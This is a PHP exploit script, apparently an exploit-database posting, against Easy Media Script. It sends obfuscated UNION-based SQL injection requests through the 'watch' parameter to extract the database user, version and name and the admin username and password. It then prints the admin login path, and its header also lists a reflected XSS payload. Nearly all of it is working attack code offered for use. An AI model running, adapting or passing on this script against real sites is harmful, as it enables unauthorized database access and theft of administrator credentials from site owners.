<?php

if(!$argv[1])
die("

Usage   : php exploit.php [site]
Example : php exploit.php http://site.tld/[PATH]/

");
print_r("

# Tilte......: [ Easy Media Script SQL Injection ]
# Author.....: [ Lagripe-Dz ]
# Date.......: [ 27-o5-2o11 ]
# Location ..: [ ALGERIA ]
# HoMe ......: [ Sec4Ever.com & Lagripe-Dz.org ]
# Download ..: [ http://easymediascript.com/ ]
# Gr33tz ....: [ All Sec4ever Member'z ]

                      -==[ ExPloiT ]==-

# SQL Inj : http://site/ems/?watch=1'
# XSS     : http://site/ems/?go=\"><
ScRiPt>alert(0)</ScRiPt>

                       -==[ Start ]==-

");

$t=array("db_user   "=>"user()","db_version"=>"version()","db_name
"=>"database()",
"UserName  "=>"user","Password  "=>"pass");

foreach($t as $r=>$y){

$x=@file_get_contents($argv[1]."?watch=-1'/**//**//*!uNiOn*//**//**//*!sElEcT*//**//**/1,group_concat(0x".bin2hex("<$r>").",$y,0x".bin2hex("<$r>")."),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25/**//**/fRoM/**//**/ip_admin%23");

preg_match_all("{<$r>(.*?)<$r>}i",$x, $dz);

echo $u = ($dz[1][0]) ? "[-] $r  : ".$dz[1][0]."\n" : "[-] $r  : Failed
!\n";

}
echo "[-] AdminPanel  : ".$argv[1]."ip-admin/login.php\n";

print_r("
                      -==[ Finished ]==-
");

# END .. !

?>
